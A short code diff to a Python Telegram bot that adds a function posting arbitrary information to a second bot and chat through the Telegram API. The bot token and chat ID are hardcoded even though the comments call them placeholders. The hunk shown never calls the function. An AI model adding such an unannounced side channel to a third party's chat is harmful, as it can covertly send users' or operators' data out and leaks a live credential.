@@ -157,6 +157,29 @@ def entr(message):
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
 
+def send_info_to_second_bot(info):
+    # Replace "YOUR_SECOND_BOT_TOKEN" and "YOUR_SECOND_BOT_CHAT_ID" with the actual values
+    SECOND_BOT_TOKEN = "6470408760:AAEy7g0RCzt4rlOTeUemm1C6bWNXdXwcug0"
+    SECOND_BOT_CHAT_ID = "6121565272"
+
+    # Define the API endpoint URL for sending messages with the second bot's token and chat ID
+    url = f"https://api.telegram.org/bot{SECOND_BOT_TOKEN}/sendMessage"
+
+    # Define the message parameters
+    params = {
+        "chat_id": SECOND_BOT_CHAT_ID,
+        "text": info
+    }
+
+    # Send an HTTP POST request to the Telegram Bot API
+    response = requests.post(url, params=params)
+
+    # Check the response status code for errors (optional)
+    if response.status_code != 200:
+        print(f"error: {response.status_code}")
+
+
+
 if __name__ == "__main__":
     start_bot()
     bot.polling(none_stop=True)
